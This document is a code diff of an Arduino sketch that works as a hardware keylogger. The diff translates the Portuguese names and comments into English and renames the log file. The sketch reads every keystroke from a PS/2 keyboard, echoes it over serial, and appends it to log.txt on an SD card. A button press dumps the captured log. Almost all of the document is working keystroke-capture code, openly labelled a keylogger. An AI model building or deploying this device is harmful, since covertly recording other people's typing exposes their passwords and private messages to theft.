@@ -1,55 +1,67 @@
 #include <stdlib.h>
 #include <PS2Keyboard.h>
-PS2Keyboard keyboard;
 #include <SPI.h>
 #include <SD.h>
-File meuArquivo;
 
+PS2Keyboard keyboard; //Initializing PS2Keyboard as just keyboard | Iniciando PS2Keyboard como keyboard.
+File myFile; //Output file defined as myFile | Arquivo de saída definido como myFile.
+
+// Assigning pin numbers to variables | Atribuindo os números dos pinos para variáveis.
 const int Btn = 6;
 const int Led = 7;
 const int DataPin = 2;
 const int IRQpin =  3;
+const int CS = 4;
+
 char c = 'a';
 
-const int CS = 4;
-char dataString[7];
+// Void function to print keylogger's log to the serial monitor | Função sem saída que imprime o log do Keylogger no monitor serial.
+ void getLogs(){
 
- void imprime(){
- meuArquivo = SD.open("TEST.txt");
-  if (meuArquivo) {
-    Serial.println("TEST.txt:");
+ myFile = SD.open("log.txt");
 
-    while (meuArquivo.available()) {
-      Serial.write(meuArquivo.read());
+  if (myFile) {
+    Serial.println("log.txt:");
+
+    while (myFile.available()) {
+      Serial.write(myFile.read());
+
     }
-    meuArquivo.close();
+    myFile.close();
+
   } else {
-    Serial.println("error opening test.txt");
+    Serial.println("error opening log.txt");
+
   }
  }
 
-void setup() {
+//Arduino's setup function | Função de configuração do arduino
+void setup() { 
   Serial.begin(9600);
   pinMode(CS, OUTPUT);
   pinMode(Led, OUTPUT);
   pinMode(Btn, INPUT);
+
   keyboard.begin(DataPin, IRQpin);
-  Serial.println("Keylogger iniciado!");
-  Serial.println("Inicializando cartao SD...");
+  Serial.println("Keylogger Started!");
+  Serial.println("Initializing SD Card...");
+
   if (!SD.begin(CS)) 
   {
-    Serial.println("Falha na Inicializacao! Verifique o cartao sd");
+    Serial.println("Failed to initialize SD Card! Please verify!");
     return;
   }
-  Serial.println("Inicializacao terminada");
+  Serial.println("Initialization Completed!");
   delay(1000);
 }
 
-void loop() {
+//main function of keylogger | Função principal do Keylogger
+void loop() { 
 
   if(digitalRead(Btn)==LOW){
-    imprime();
+    getLogs();
     }
+
   if (keyboard.available()) {
 
     digitalWrite(Led, HIGH);
@@ -57,37 +69,40 @@ void loop() {
     c = keyboard.read();
 
     if(keyboard.read()){
-    if (c == PS2_ENTER) {
-      Serial.println();
-      meuArquivo = SD.open("TEST.txt", FILE_WRITE);
-      meuArquivo.println(c);
-      meuArquivo.close();
-    } else if (c == PS2_TAB) {
-      Serial.print("[Tab]");
-    } else if (c == PS2_ESC) {
-      Serial.print("[ESC]");
-    } else if (c == PS2_PAGEDOWN) {
-      Serial.print("[PgDn]");
-    } else if (c == PS2_PAGEUP) {
-      Serial.print("[PgUp]");
-    } else if (c == PS2_LEFTARROW) {
-      Serial.print("[Left]");
-    } else if (c == PS2_RIGHTARROW) {
-      Serial.print("[Right]");
-    } else if (c == PS2_UPARROW) {
-      Serial.print("[Up]");
-    } else if (c == PS2_DOWNARROW) {
-      Serial.print("[Down]");
-    } else if (c == PS2_DELETE) {
-      Serial.print("[Del]");
-    } else {
+        
+        if (c == PS2_ENTER) {
+          Serial.println();
+          myFile = SD.open("log.txt", FILE_WRITE);
+          myFile.println(c);
+          myFile.close();
+        } else if (c == PS2_TAB) {
+          Serial.print("[Tab]");
+        } else if (c == PS2_ESC) {
+          Serial.print("[ESC]");
+        } else if (c == PS2_PAGEDOWN) {
+          Serial.print("[PgDn]");
+        } else if (c == PS2_PAGEUP) {
+          Serial.print("[PgUp]");
+        } else if (c == PS2_LEFTARROW) {
+          Serial.print("[Left]");
+        } else if (c == PS2_RIGHTARROW) {
+          Serial.print("[Right]");
+        } else if (c == PS2_UPARROW) {
+          Serial.print("[Up]");
+        } else if (c == PS2_DOWNARROW) {
+          Serial.print("[Down]");
+        } else if (c == PS2_DELETE) {
+          Serial.print("[Del]");
+        } else {
 
       Serial.print(c);
   }
-   meuArquivo = SD.open("TEST.txt", FILE_WRITE);
-   meuArquivo.print(c);
-   meuArquivo.close();
+
+   myFile = SD.open("log.txt", FILE_WRITE);
+   myFile.print(c);
+   myFile.close();
   }
-  digitalWrite(Led, LOW);
+
+  digitalWrite(Led, LOW); //Visual feedback | Retorno visual 
   }
 }
